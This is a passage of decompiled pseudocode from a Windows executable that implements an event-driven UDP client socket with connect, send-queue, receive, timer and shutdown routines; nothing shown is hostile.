      *(undefined4 *)((int)this + 0xc) = 0;
      *(LONG *)((int)this + 8) = 0;
    }
  }
  return 1;
}



/* Function: FUN_00403240 */

int FUN_00403240(int param_1,int param_2)

{
  int in_EAX;
  int iVar1;
  int iVar2;
  int iVar3;
  int local_8;
  
  local_8 = 0;
  iVar2 = param_2;
  if (0x3ffff < param_2) {
    do {
      iVar3 = 0;
      do {
        iVar1 = Ordinal_19(*(undefined4 *)(param_1 + 100),in_EAX,0x40000,0);
        if (0 < iVar1) break;
        iVar3 = iVar3 + 1;
      } while (iVar3 < 0xf);
      if (iVar3 == 0xf) {
        return -1;
      }
      local_8 = local_8 + iVar1;
      iVar2 = iVar2 + -0x40000;
      in_EAX = in_EAX + 0x40000;
    } while (0x3ffff < iVar2);
  }
  if (0 < iVar2) {
    iVar3 = 0;
    do {
      iVar1 = Ordinal_19(*(undefined4 *)(param_1 + 100),in_EAX,iVar2,0);
      if (0 < iVar1) break;
      iVar3 = iVar3 + 1;
    } while (iVar3 < 0xf);
    if (iVar3 == 0xf) {
      return -1;
    }
    local_8 = local_8 + iVar1;
  }
  if (local_8 != param_2) {
    return -1;
  }
  return local_8;
}



/* Function: FUN_004032e0 */

void __fastcall FUN_004032e0(int param_1)

{
  WaitForSingleObject(*(HANDLE *)(param_1 + 4),0xffffffff);
  Sleep(600);
  InterlockedExchange((LONG *)(param_1 + 0x18),0);
  WaitForSingleObject(*(HANDLE *)(param_1 + 0x5c),0xffffffff);
  WaitForSingleObject(*(HANDLE *)(param_1 + 0x60),0xffffffff);
  *(undefined4 *)(*(int *)(param_1 + 0x1c) + 8) = 1;
  Sleep(300);
  return;
}



/* Function: FUN_00403340 */

uint FUN_00403340(int param_1,void *param_2,size_t param_3)

{
  void *_Dst;
  uint *puVar1;
  uint *puVar2;
  DWORD DVar3;
  int iVar4;
  uint *puVar5;
  uint extraout_ECX;
  uint uVar6;
  uint *puVar7;
  uint uVar8;
  uint uVar9;
  int iVar10;
  
  FUN_00401100();
  FID_conflict__memcpy(*(void **)(param_1 + 0x34),param_2,param_3);
  *(int *)(param_1 + 0x34) = *(int *)(param_1 + 0x34) + param_3;
LAB_00403380:
  do {
    iVar10 = *(int *)(param_1 + 0x30);
    if ((iVar10 == 0) || (iVar4 = *(int *)(param_1 + 0x34) - iVar10, iVar4 < 0xf)) {
LAB_004034d1:
      return CONCAT31((int3)((uint)iVar10 >> 8),1);
    }
    uVar8 = 10;
    puVar2 = *(uint **)(param_1 + 0x30) + 1;
    puVar7 = (uint *)(param_1 + 0x20);
    do {
      puVar5 = puVar7;
      puVar1 = puVar2;
      puVar7 = puVar5;
      if (*puVar5 != *puVar1) goto LAB_004034b6;
      uVar8 = uVar8 - 4;
      puVar2 = puVar1 + 1;
      puVar7 = puVar5 + 1;
    } while (3 < uVar8);
    if (((char)*puVar2 != (char)*puVar7) ||
       (*(char *)((int)puVar1 + 5) != *(char *)((int)puVar5 + 5))) {
LAB_004034b6:
      *(undefined4 *)(param_1 + 0x34) = *(undefined4 *)(param_1 + 0x30);
      uVar8 = FUN_004011b0(puVar7,0x400);
      return uVar8 & 0xffffff00;
    }
    uVar8 = **(uint **)(param_1 + 0x30);
    iVar10 = CONCAT31((int3)((uint)puVar2 >> 8),*(char *)((int)puVar1 + 5));
    if ((uVar8 == 0) || (iVar10 = iVar4, iVar4 < (int)uVar8)) goto LAB_004034d1;
    DVar3 = timeGetTime();
    *(DWORD *)(param_1 + 0x14) = DVar3;
    *(undefined4 *)(param_1 + 0x44) = *(undefined4 *)(param_1 + 0x40);
    FUN_004011b0(*(undefined4 *)(param_1 + 0x40),0x400);
    FUN_00401060((void *)(*(int *)(param_1 + 0x30) + 0xe),uVar8 - 0xe,1,param_1 + 0x20);
    if (*(int *)(param_1 + 0x40) == 0) {
      iVar10 = 0;
    }
    else {
      iVar10 = *(int *)(param_1 + 0x44) - *(int *)(param_1 + 0x40);
    }
    (**(code **)**(undefined4 **)(param_1 + 0x1c))(*(undefined4 *)(param_1 + 0x40),iVar10);
    uVar6 = *(uint *)(param_1 + 0x38);
  } while (uVar6 < uVar8);
  _Dst = *(void **)(param_1 + 0x30);
  if (_Dst == (void *)0x0) {
    uVar9 = 0;
  }
  else {
    uVar9 = *(int *)(param_1 + 0x34) - (int)_Dst;
  }
  if (uVar9 < uVar8) {
    if (_Dst != (void *)0x0) {
      uVar8 = *(int *)(param_1 + 0x34) - (int)_Dst;
      goto LAB_00403479;
    }
  }
  else {
LAB_00403479:
    if (uVar8 != 0) {
      FID_conflict__memcpy(_Dst,(void *)((int)_Dst + uVar8),uVar6 - uVar8);
      *(int *)(param_1 + 0x34) = *(int *)(param_1 + 0x34) - uVar8;
      uVar6 = extraout_ECX;
    }
    if (*(int *)(param_1 + 0x30) != 0) {
      FUN_004011b0(uVar6,*(int *)(param_1 + 0x34) - *(int *)(param_1 + 0x30));
      goto LAB_00403380;
    }
  }
  FUN_004011b0(uVar6,0);
  goto LAB_00403380;
}



/* Function: FUN_004034e0 */

undefined4 FUN_004034e0(LPCWSTR param_1,undefined4 param_2)

{
  uint uVar1;
  void *in_EAX;
  LONG LVar2;
  int iVar3;
  uintptr_t uVar4;
  DWORD DVar5;
  undefined4 local_8;
  
  uVar1 = *(uint *)((int)in_EAX + 0x198);
  if (uVar1 == 0) {
    *(undefined4 *)((int)in_EAX + 0x1b8) = 0x598;
  }
  else {
    if (0x598 < uVar1) {
      return 0;
    }
    *(uint *)((int)in_EAX + 0x1b8) = uVar1;
  }
  *(undefined4 *)((int)in_EAX + 100) = 0;
  FUN_00403640();
  *(undefined4 *)((int)in_EAX + 0x30) = 1;
  *(undefined4 *)((int)in_EAX + 0x34) = 5;
  *(undefined4 *)((int)in_EAX + 0x38) = 0;
  *(undefined4 *)((int)in_EAX + 0x3c) = 1;
  LVar2 = InterlockedIncrement((LONG *)&DAT_0041da88);
  *(LONG *)((int)in_EAX + 0x48) = LVar2;
  if (LVar2 == 0) {
    LVar2 = InterlockedIncrement((LONG *)&DAT_0041da88);
    *(LONG *)((int)in_EAX + 0x48) = LVar2;
  }
  local_8 = 0x40000;
  Ordinal_21(*(undefined4 *)((int)in_EAX + 0x40),0xffff,0x1001,&local_8,4);
  local_8 = 0x40000;
  Ordinal_21(*(undefined4 *)((int)in_EAX + 0x40),0xffff,0x1002,&local_8,4);
  iVar3 = FUN_004036d0(param_1,param_2);
  if (iVar3 == 0) {
    DVar5 = Ordinal_111();
    *(undefined4 *)((int)in_EAX + 0x5c) = 0xb;
  }
  else {
    uVar4 = __beginthreadex((void *)0x0,0,FUN_00403850,in_EAX,0,(uint *)((int)in_EAX + 0x58));
    *(uintptr_t *)((int)in_EAX + 0x54) = uVar4;
    if (uVar4 != 0) {
      ResetEvent(*(HANDLE *)((int)in_EAX + 0x2c));
      return 1;
    }
    *(undefined4 *)((int)in_EAX + 0x5c) = 8;
    DVar5 = 0x65f;
  }
  SetLastError(DVar5);
  *(undefined4 *)((int)in_EAX + 0x30) = 0;
  *(undefined4 *)((int)in_EAX + 0x34) = 5;
  *(undefined4 *)((int)in_EAX + 0x38) = 0;
  *(undefined4 *)((int)in_EAX + 0x3c) = 1;
  DVar5 = GetLastError();
  FUN_00403f50();
  SetLastError(DVar5);
  return 0;
}



/* Function: FUN_00403640 */

void FUN_00403640(void)

{
  int iVar1;
  HANDLE pvVar2;
  void *_Dst;
  int unaff_ESI;
  
  pvVar2 = CreateWaitableTimerW((LPSECURITY_ATTRIBUTES)0x0,0,(LPCWSTR)0x0);
  *(HANDLE *)(unaff_ESI + 0x1cc) = pvVar2;
  iVar1 = *(int *)(unaff_ESI + 0x4c);
  *(undefined4 *)(unaff_ESI + 0x8c) = 0x598;
  *(int *)(unaff_ESI + 0x90) = iVar1;
  *(undefined4 *)(unaff_ESI + 0x94) = *(undefined4 *)(unaff_ESI + 0x50);
  if (*(void **)(unaff_ESI + 0x9c) != (void *)0x0) {
    _free(*(void **)(unaff_ESI + 0x9c));
    *(undefined4 *)(unaff_ESI + 0x9c) = 0;
    *(undefined4 *)(unaff_ESI + 0x98) = 0;
    *(undefined4 *)(unaff_ESI + 0xdc) = 0;
    *(undefined4 *)(unaff_ESI + 0x11c) = 0;
  }
  if (iVar1 != 0) {
    *(int *)(unaff_ESI + 0x98) = iVar1;
    *(undefined4 *)(unaff_ESI + 0xdc) = 0;
    *(undefined4 *)(unaff_ESI + 0x11c) = 0;
    _Dst = _malloc(iVar1 * 4);
    *(void **)(unaff_ESI + 0x9c) = _Dst;
    _memset(_Dst,0,iVar1 * 4);
  }
  return;
}



/* Function: FUN_004036d0 */

void FUN_004036d0(LPCWSTR param_1,undefined4 param_2)

{
  int iVar1;
  undefined4 uVar2;
  LPSTR pCVar3;
  int unaff_ESI;
  LPSTR pCVar4;
  int iVar5;
  LPCSTR pCVar6;
  LPBOOL pBVar7;
  undefined1 local_28 [4];
  int local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined2 local_18;
  undefined2 local_16;
  undefined4 local_14;
  uint local_8;
  
  local_8 = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  local_1c = 0;
  iVar1 = Ordinal_23(2,2,0x11);
  *(int *)(unaff_ESI + 0x40) = iVar1;
  if (iVar1 == -1) {
LAB_004036fe:
    __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
    return;
  }
  local_20 = 0;
  WSAIoctl(iVar1,0x9800000c,&local_20,4,0,0,local_28,0,0);
  Ordinal_21(*(undefined4 *)(unaff_ESI + 0x40),0xffff,0xfffffffb,&local_20,4);
  Ordinal_21(*(undefined4 *)(unaff_ESI + 0x40),0xffff,4,&local_20,4);
  uVar2 = WSACreateEvent();
  pBVar7 = (LPBOOL)0x0;
  pCVar6 = (LPCSTR)0x0;
  iVar5 = 0;
  pCVar4 = (LPSTR)0x0;
  *(undefined4 *)(unaff_ESI + 0x44) = uVar2;
  iVar1 = lstrlenW(param_1);
  local_24 = WideCharToMultiByte(0,0,param_1,iVar1,pCVar4,iVar5,pCVar6,pBVar7);
  pCVar3 = (LPSTR)FUN_004069bf(local_24 + 1);
  pBVar7 = (LPBOOL)0x0;
  pCVar6 = (LPCSTR)0x0;
  pCVar4 = pCVar3;
  iVar1 = local_24;
  iVar5 = lstrlenW(param_1);
  WideCharToMultiByte(0,0,param_1,iVar5,pCVar4,iVar1,pCVar6,pBVar7);
  pCVar3[local_24] = '\0';
  iVar1 = Ordinal_52(pCVar3);
  FUN_004069ca(pCVar3);
  if (iVar1 == 0) goto LAB_004036fe;
  local_18 = 2;
  local_16 = Ordinal_9(param_2);
  local_14 = *(undefined4 *)**(undefined4 **)(iVar1 + 0xc);
  iVar1 = WSAEventSelect(*(undefined4 *)(unaff_ESI + 0x40),*(undefined4 *)(unaff_ESI + 0x44),0x30);
  if (iVar1 == -1) goto LAB_00403837;
  iVar1 = Ordinal_4(*(undefined4 *)(unaff_ESI + 0x40),&local_18,0x10);
  if (iVar1 == 0) {
LAB_00403830:
    local_1c = 1;
  }
  else {
    if (iVar1 == -1) {
      iVar1 = Ordinal_111();
      if (iVar1 == 0x2733) goto LAB_00403830;
    }
    local_1c = 0;
  }
LAB_00403837:
  __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



/* Function: FUN_00403850 */

/* WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe */
/* WARNING: Unable to track spacebase fully for stack */

void FUN_00403850(int param_1)

{
  uint lPeriod;
  int iVar1;
  bool bVar2;
  int iVar3;
  DWORD DVar4;
  undefined3 extraout_var;
  undefined3 extraout_var_00;
  undefined4 uVar5;
  undefined1 *puVar6;
  undefined1 *puVar8;
  undefined1 *puVar9;
  undefined4 *puVar10;
  LARGE_INTEGER LVar11;
  int local_c [2];
  undefined4 *puVar7;
  
  local_c[1] = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  GetCurrentThreadId();
  FUN_00402c50();
  lPeriod = *(uint *)(param_1 + 0x1a8);
  LVar11 = (LARGE_INTEGER)__allmul(lPeriod,0,0xffffd8f0,-1);
  *(LARGE_INTEGER *)(param_1 + 0x1d0) = LVar11;
  SetWaitableTimer(*(HANDLE *)(param_1 + 0x1cc),(LARGE_INTEGER *)(param_1 + 0x1d0),lPeriod,
                   (PTIMERAPCROUTINE)0x0,(LPVOID)0x0,0);
  iVar3 = *(int *)(param_1 + 0x1cc);
  local_c[0] = 4;
  if (iVar3 != 0) {
    local_c[0] = 5;
  }
  iVar1 = local_c[0] * -4;
  *(undefined4 *)(&stack0xffffffe8 + iVar1) = *(undefined4 *)(param_1 + 0x44);
  *(undefined4 *)(&stack0xffffffec + iVar1) = *(undefined4 *)(param_1 + 0x188);
  *(undefined4 *)(&stack0xfffffff0 + iVar1) = *(undefined4 *)(param_1 + 0x18c);
  local_c[-local_c[0]] = *(int *)(param_1 + 400);
  puVar6 = &stack0xffffffe8 + iVar1;
  if (iVar3 != 0) {
    local_c[1 - local_c[0]] = iVar3;
    puVar6 = &stack0xffffffe8 + iVar1;
  }
  do {
    while( true ) {
      iVar3 = local_c[0];
      if ((*(int *)(param_1 + 100) != 1) && (*(int *)(param_1 + 100) != 0)) goto LAB_00403926;
      *(undefined4 *)(puVar6 + -4) = 0;
      *(undefined4 *)(puVar6 + -8) = 0xffffffff;
      *(undefined4 *)(puVar6 + -0xc) = 0;
      *(undefined1 **)(puVar6 + -0x10) = &stack0xffffffe8 + iVar1;
      *(int *)(puVar6 + -0x14) = iVar3;
      puVar7 = (undefined4 *)(puVar6 + -0x18);
      puVar6 = puVar6 + -0x18;
      *puVar7 = 0x403917;
      iVar3 = WSAWaitForMultipleEvents();
      if (iVar3 != 0) break;
      *(undefined4 *)(puVar6 + -4) = 0x403922;
      iVar3 = FUN_00403a40(param_1);
LAB_00403922:
      if (iVar3 == 0) goto LAB_00403926;
    }
    if (iVar3 == 1) {
      *(undefined4 *)(puVar6 + -4) = 0x40396d;
      iVar3 = FUN_00403dc0();
      goto LAB_00403922;
    }
    if (iVar3 == 2) goto LAB_0040393c;
    if (iVar3 == 3) {
      *(int *)(puVar6 + -4) = param_1;
      *(undefined4 *)(puVar6 + -8) = 0x40397f;
      iVar3 = FUN_00403c80(*(int *)(puVar6 + -4));
      goto LAB_00403922;
    }
    if (iVar3 != 4) {
      if (iVar3 != -1) {
        *(undefined4 *)(puVar6 + -4) = 0x403a19;
        FUN_00401280();
      }
      puVar10 = (undefined4 *)(puVar6 + -4);
      puVar6 = puVar6 + -4;
      *puVar10 = 0x403a1f;
      uVar5 = Ordinal_111();
      *(undefined4 *)(param_1 + 0x30) = 1;
      *(undefined4 *)(param_1 + 0x34) = 0;
      *(undefined4 *)(param_1 + 0x38) = uVar5;
      *(undefined4 *)(param_1 + 0x3c) = 1;
      goto LAB_00403926;
    }
    puVar9 = puVar6;
    if (*(int *)(param_1 + 0x1fc) == 2) {
      if (*(int *)(param_1 + 0x1e4) == 0) {
        *(undefined4 *)(puVar6 + -4) = 0x4039a9;
        bVar2 = FUN_00404ca0(param_1 + 0x1d8);
        if (CONCAT31(extraout_var,bVar2) == 0) break;
      }
      *(undefined4 *)(puVar6 + -4) = 0;
      *(undefined4 *)(puVar6 + -8) = 0x4039ba;
      iVar3 = FUN_00404e70(*(int *)(puVar6 + -4));
    }
    else {
      if (*(int *)(param_1 + 0x1fc) != 1) {
        *(undefined4 *)(puVar6 + -4) = 0x139f;
        puVar9 = puVar6 + -8;
        *(undefined4 *)(puVar6 + -8) = 0x403a08;
        SetLastError(*(DWORD *)(puVar6 + -4));
        break;
      }
      *(undefined4 *)(puVar6 + -4) = 0x4039cc;
      bVar2 = FUN_00404ca0(param_1 + 0x1d8);
      iVar3 = CONCAT31(extraout_var_00,bVar2);
    }
  } while (iVar3 != 0);
  puVar6 = puVar9 + -4;
  *(undefined4 *)(puVar9 + -4) = 0x4039da;
  DVar4 = GetLastError();
  if (DVar4 == 0) {
    DVar4 = 0x4c7;
  }
  *(undefined4 *)(param_1 + 0x30) = 1;
  *(undefined4 *)(param_1 + 0x34) = 5;
  *(DWORD *)(param_1 + 0x38) = DVar4;
  *(undefined4 *)(param_1 + 0x3c) = 1;
LAB_00403926:
  if ((*(int *)(param_1 + 100) == 1) || (*(int *)(param_1 + 100) == 0)) {
    *(undefined4 *)(puVar6 + -4) = 0x40393c;
    FUN_00403f50();
  }
LAB_0040393c:
  puVar8 = puVar6 + -4;
  *(undefined4 *)(puVar6 + -4) = 0x403942;
  DVar4 = GetCurrentThreadId();
  *(DWORD *)(puVar8 + -4) = DVar4;
  *(undefined4 *)(puVar8 + -8) = 0x403948;
  FUN_00402c50();
  __security_check_cookie(local_c[1] ^ (uint)&stack0xfffffffc);
  return;
}



/* Function: FUN_00403a40 */

void __fastcall FUN_00403a40(int param_1)

{
  int iVar1;
  int iVar2;
  uint local_34;
  int local_30;
  int local_2c;
  int local_1c;
  uint local_8;
  
  local_8 = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  iVar2 = 1;
  iVar1 = WSAEnumNetworkEvents
                    (*(undefined4 *)(param_1 + 0x40),*(undefined4 *)(param_1 + 0x44),&local_34);
  if (iVar1 == -1) {
    iVar2 = FUN_00403b60(&local_34);
  }
  if (*(int *)(param_1 + 0x60) == 0) {
    if (iVar2 == 0) goto LAB_00403b41;
    if (((byte)local_34 & 0x10) != 0) {
      iVar2 = FUN_00403bd0();
    }
  }
  if (iVar2 != 0) {
    if (((byte)local_34 & 1) != 0) {
      if (local_30 == 0) {
        iVar2 = FUN_00403c80(param_1);
      }
      else {
        *(int *)(param_1 + 0x38) = local_30;
        *(undefined4 *)(param_1 + 0x30) = 1;
        *(undefined4 *)(param_1 + 0x34) = 4;
        *(undefined4 *)(param_1 + 0x3c) = 1;
        iVar2 = 0;
      }
    }
    if (iVar2 != 0) {
      if (((byte)local_34 & 2) != 0) {
        if (local_2c == 0) {
          iVar2 = FUN_00403dc0();
        }
        else {
          *(int *)(param_1 + 0x38) = local_2c;
          *(undefined4 *)(param_1 + 0x30) = 1;
          *(undefined4 *)(param_1 + 0x34) = 3;
          *(undefined4 *)(param_1 + 0x3c) = 1;
          iVar2 = 0;
        }
      }
      if ((iVar2 != 0) && (((byte)local_34 & 0x20) != 0)) {
        *(undefined4 *)(param_1 + 0x30) = 1;
        *(undefined4 *)(param_1 + 0x34) = 5;
        *(undefined4 *)(param_1 + 0x3c) = 1;
        if (local_1c != 0) {
          *(int *)(param_1 + 0x38) = local_1c;
          __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
          return;
        }
        *(undefined4 *)(param_1 + 0x38) = 0;
        __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
        return;
      }
    }
  }
LAB_00403b41:
  __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



/* Function: FUN_00403b60 */

undefined4 FUN_00403b60(uint *param_1)

{
  uint uVar1;
  undefined4 uVar2;
  int iVar3;
  int unaff_ESI;
  undefined4 uVar4;
  
  uVar2 = Ordinal_111();
  uVar1 = *param_1;
  uVar4 = 0;
  if ((uVar1 & 0x10) == 0) {
    if ((uVar1 & 0x20) == 0) {
      if ((uVar1 & 1) == 0) {
        if ((uVar1 & 2) != 0) {
          uVar4 = 3;
        }
      }
      else {
        uVar4 = 4;
      }
    }
    else {
      uVar4 = 5;
    }
  }
  else {
    uVar4 = 2;
  }
  iVar3 = WSAResetEvent(*(undefined4 *)(unaff_ESI + 0x44));
  if (iVar3 == 0) {
    FUN_00401280();
  }
  *(undefined4 *)(unaff_ESI + 0x34) = uVar4;
  *(undefined4 *)(unaff_ESI + 0x30) = 1;
  *(undefined4 *)(unaff_ESI + 0x38) = uVar2;
  *(undefined4 *)(unaff_ESI + 0x3c) = 1;
  return 0;
}



/* Function: FUN_00403bd0 */

undefined4 FUN_00403bd0(void)

{
  int in_EAX;
  int iVar1;
  void *unaff_ESI;
  int iVar2;
  
  iVar1 = *(int *)(in_EAX + 0x14);
  if (iVar1 == 0) {
    iVar1 = WSAEventSelect(*(undefined4 *)((int)unaff_ESI + 0x40),
                           *(undefined4 *)((int)unaff_ESI + 0x44),0x23);
    if (iVar1 != -1) {
      *(undefined4 *)((int)unaff_ESI + 0x60) = 1;
      *(undefined4 *)((int)unaff_ESI + 100) = 1;
      FUN_00404af0(unaff_ESI,(undefined4 *)((int)unaff_ESI + 0x1d8),(int *)((int)unaff_ESI + 0x19c))
      ;
      iVar2 = 0;
      iVar1 = Ordinal_19(*(undefined4 *)((int)unaff_ESI + 0x40),0,0,0);
      if (iVar1 == -1) {
        iVar2 = Ordinal_111();
        if (iVar2 == 0x2733) {
          iVar2 = 0;
        }
      }
      FUN_00402c50();
      if (iVar2 != 0) {
        FUN_00401280();
      }
      return 1;
    }
    iVar1 = Ordinal_111();
  }
  *(undefined4 *)((int)unaff_ESI + 0x30) = 1;
  *(undefined4 *)((int)unaff_ESI + 0x34) = 2;
  *(int *)((int)unaff_ESI + 0x38) = iVar1;
  *(undefined4 *)((int)unaff_ESI + 0x3c) = 1;
  return 0;
}



/* Function: FUN_00403c80 */

undefined4 FUN_00403c80(int param_1)

{
  int iVar1;
  int *piVar2;
  DWORD DVar3;
  uint uVar4;
  
  do {
    while (iVar1 = Ordinal_16(*(undefined4 *)(param_1 + 0x40),*(undefined4 *)(param_1 + 0x70),0x598,
                              0), iVar1 < 1) {
      if (iVar1 == -1) {
        DVar3 = Ordinal_111();
        if (DVar3 == 0x2733) {
          return 1;
        }
        if ((DVar3 != 0x2744) && (DVar3 != 0x2746)) goto LAB_00403d34;
      }
    }
    if (iVar1 == 0x10) {
      piVar2 = &DAT_00417440;
      uVar4 = 0x10;
      while( true ) {
        if (uVar4 < 4) {
          *(undefined4 *)(param_1 + 0x30) = 1;
          *(undefined4 *)(param_1 + 0x34) = 5;
          *(undefined4 *)(param_1 + 0x3c) = 0;
          *(undefined4 *)(param_1 + 0x38) = 0;
          return 0;
        }
        if (*(int *)(*(int *)(param_1 + 0x70) + -0x417440 + (int)piVar2) != *piVar2) break;
        uVar4 = uVar4 - 4;
        piVar2 = piVar2 + 1;
      }
    }
    SetLastError(0);
    if (iVar1 < 0x18) {
      if (iVar1 != 0xc) {
        Ordinal_112(0xd);
        break;
      }
      iVar1 = FUN_00404f20();
    }
    else {
      iVar1 = FUN_00405070(*(int *)(param_1 + 0x70),iVar1,*(int *)(param_1 + 0x1c0));
    }
  } while (iVar1 != 2);
  FUN_00402c50();
  DVar3 = GetLastError();
  if (DVar3 == 0) {
    DVar3 = 0x4c7;
  }
LAB_00403d34:
  *(undefined4 *)(param_1 + 0x3c) = 1;
  *(undefined4 *)(param_1 + 0x34) = 4;
  *(undefined4 *)(param_1 + 0x30) = 1;
  *(DWORD *)(param_1 + 0x38) = DVar3;
  return 0;
}



/* Function: FUN_00403dc0 */

undefined4 FUN_00403dc0(void)

{
  undefined4 *lpMem;
  int iVar1;
  int unaff_ESI;
  
  while( true ) {
    if (*(int *)(unaff_ESI + 0x194) < 1) {
      return 1;
    }
    EnterCriticalSection((LPCRITICAL_SECTION)(unaff_ESI + 0x160));
    lpMem = *(undefined4 **)(unaff_ESI + 0x17c);
    if (lpMem == *(undefined4 **)(unaff_ESI + 0x180)) {
      if (lpMem != (undefined4 *)0x0) {
        *(undefined4 *)(unaff_ESI + 0x17c) = 0;
        *(undefined4 *)(unaff_ESI + 0x180) = 0;
      }
    }
    else {
      iVar1 = lpMem[1];
      *(int *)(unaff_ESI + 0x17c) = iVar1;
      *(undefined4 *)(iVar1 + 8) = 0;
    }
    if (lpMem != (undefined4 *)0x0) {
      lpMem[1] = 0;
      lpMem[2] = 0;
      *(int *)(unaff_ESI + 0x178) = *(int *)(unaff_ESI + 0x178) + -1;
    }
    LeaveCriticalSection((LPCRITICAL_SECTION)(unaff_ESI + 0x160));
    if (lpMem == (undefined4 *)0x0) break;
    iVar1 = Ordinal_19(*(undefined4 *)(unaff_ESI + 0x40),lpMem[5],lpMem[6] - lpMem[5],0);
    if (iVar1 < 1) {
      if (iVar1 == -1) {
        iVar1 = Ordinal_111();
        if (iVar1 == 0x2733) {
          EnterCriticalSection((LPCRITICAL_SECTION)(unaff_ESI + 0x160));
          if (*(int *)(unaff_ESI + 0x17c) == 0) {
            lpMem[2] = 0;
            lpMem[1] = 0;
            *(undefined4 **)(unaff_ESI + 0x180) = lpMem;
          }
          else {
            *(undefined4 **)(*(int *)(unaff_ESI + 0x17c) + 8) = lpMem;
            lpMem[1] = *(undefined4 *)(unaff_ESI + 0x17c);
          }
          *(int *)(unaff_ESI + 0x178) = *(int *)(unaff_ESI + 0x178) + 1;
          *(undefined4 **)(unaff_ESI + 0x17c) = lpMem;
          LeaveCriticalSection((LPCRITICAL_SECTION)(unaff_ESI + 0x160));
          return 1;
        }
        *(undefined4 *)(unaff_ESI + 0x30) = 1;
        *(undefined4 *)(unaff_ESI + 0x34) = 3;
        *(int *)(unaff_ESI + 0x38) = iVar1;
        *(undefined4 *)(unaff_ESI + 0x3c) = 1;
        iVar1 = FUN_00401480((LONG)lpMem);
        if (iVar1 == 0) {
          HeapFree(*(HANDLE *)*lpMem,0,lpMem);
        }
        return 0;
      }
    }
    else {
      EnterCriticalSection((LPCRITICAL_SECTION)(unaff_ESI + 0x160));
      *(int *)(unaff_ESI + 0x194) = *(int *)(unaff_ESI + 0x194) - iVar1;
      LeaveCriticalSection((LPCRITICAL_SECTION)(unaff_ESI + 0x160));
    }
    iVar1 = FUN_00401480((LONG)lpMem);
    if (iVar1 == 0) {
      HeapFree(*(HANDLE *)*lpMem,0,lpMem);
    }
  }
  return 1;
}



/* Function: FUN_00403f50 */

undefined4 FUN_00403f50(void)

{
  LONG *pLVar1;
  HANDLE pvVar2;
  int in_EAX;
  
  GetCurrentThreadId();
  if (*(int *)(in_EAX + 100) != 3) {
    pLVar1 = (LONG *)(in_EAX + 0x15c);
    FUN_00402b80(pLVar1);
    pvVar2 = *(HANDLE *)(in_EAX + 100);
    if ((pvVar2 == (HANDLE)0x1) || (*(int *)(in_EAX + 100) == 0)) {
      *(undefined4 *)(in_EAX + 100) = 2;
      *pLVar1 = 0;
      FUN_00404150(pvVar2);
      if (*(int *)(in_EAX + 0x60) != 0) {
        if (*(int *)(in_EAX + 0x3c) != 0) {
          Ordinal_19(*(undefined4 *)(in_EAX + 0x40),&DAT_00417440,0x10,0);
        }
        *(undefined4 *)(in_EAX + 0x60) = 0;
      }
      if (*(int *)(in_EAX + 0x30) != 0) {
        FUN_00402c50();
        SetEvent(*(HANDLE *)(in_EAX + 4));
        InterlockedExchange((LONG *)(in_EAX + 0x18),0);
      }
      if (*(int *)(in_EAX + 0x44) != 0) {
        WSACloseEvent(*(int *)(in_EAX + 0x44));
        *(undefined4 *)(in_EAX + 0x44) = 0;
      }
      if (*(int *)(in_EAX + 0x40) != -1) {
        Ordinal_22(*(int *)(in_EAX + 0x40),1);
        Ordinal_3(*(undefined4 *)(in_EAX + 0x40));
        *(undefined4 *)(in_EAX + 0x40) = 0xffffffff;
      }
      FUN_00404050();
      return 1;
    }
    *pLVar1 = 0;
  }
  *(undefined4 *)(in_EAX + 0x5c) = 1;
  SetLastError(0x139f);
  return 0;
}



/* Function: FUN_00404050 */

void FUN_00404050(void)

{
  int *piVar1;
  int iVar2;
  int *piVar3;
  HANDLE pvVar4;
  int iVar5;
  int extraout_ECX;
  int unaff_EDI;
  
  FUN_00404b60();
  EnterCriticalSection((LPCRITICAL_SECTION)(unaff_EDI + 0x160));
  ResetEvent(*(HANDLE *)(unaff_EDI + 0x188));
  ResetEvent(*(HANDLE *)(unaff_EDI + 0x18c));
  ResetEvent(*(HANDLE *)(unaff_EDI + 400));
  FUN_00401350();
  FUN_00401420();
  if (*(HANDLE *)(unaff_EDI + 0x7c) != (HANDLE)0x0) {
    HeapDestroy(*(HANDLE *)(unaff_EDI + 0x7c));
  }
  pvVar4 = HeapCreate(*(DWORD *)(unaff_EDI + 0x80),*(SIZE_T *)(unaff_EDI + 0x84),
                      *(SIZE_T *)(unaff_EDI + 0x88));
  *(HANDLE *)(unaff_EDI + 0x7c) = pvVar4;
  iVar5 = *(int *)(unaff_EDI + 0x74);
  piVar3 = *(int **)(iVar5 + -0x10);
  if (*(int *)(iVar5 + -0xc) != 0) {
    piVar1 = (int *)(iVar5 + -4);
    if (*(int *)(iVar5 + -4) < 0) {
      if (*(int *)(iVar5 + -8) < 0) {
        FUN_00401280();
        iVar5 = extraout_ECX;
      }
      *(undefined4 *)(iVar5 + -0xc) = 0;
      **(undefined1 **)(unaff_EDI + 0x74) = 0;
    }
    else {
      LOCK();
      iVar2 = *piVar1;
      *piVar1 = *piVar1 + -1;
      UNLOCK();
      if (iVar2 == 1 || iVar2 + -1 < 0) {
        (**(code **)(**(int **)(iVar5 + -0x10) + 4))((undefined4 *)(iVar5 + -0x10));
      }
      iVar5 = (**(code **)(*piVar3 + 0xc))();
      *(int *)(unaff_EDI + 0x74) = iVar5 + 0x10;
    }
  }
  *(undefined2 *)(unaff_EDI + 0x78) = 0;
  *(undefined4 *)(unaff_EDI + 0x194) = 0;
  *(undefined4 *)(unaff_EDI + 100) = 3;
  SetEvent(*(HANDLE *)(unaff_EDI + 0x2c));
  LeaveCriticalSection((LPCRITICAL_SECTION)(unaff_EDI + 0x160));
  return;
}



/* Function: FUN_00404150 */

void __fastcall FUN_00404150(HANDLE param_1)

{
  int in_EAX;
  int iVar1;
  int unaff_ESI;
  HANDLE local_8;
  
  if (*(int *)(unaff_ESI + 0x54) == 0) {
    return;
  }
  local_8 = param_1;
  if (in_EAX == *(int *)(unaff_ESI + 0x58)) goto LAB_004041ad;
  SetEvent(*(HANDLE *)(unaff_ESI + 0x18c));
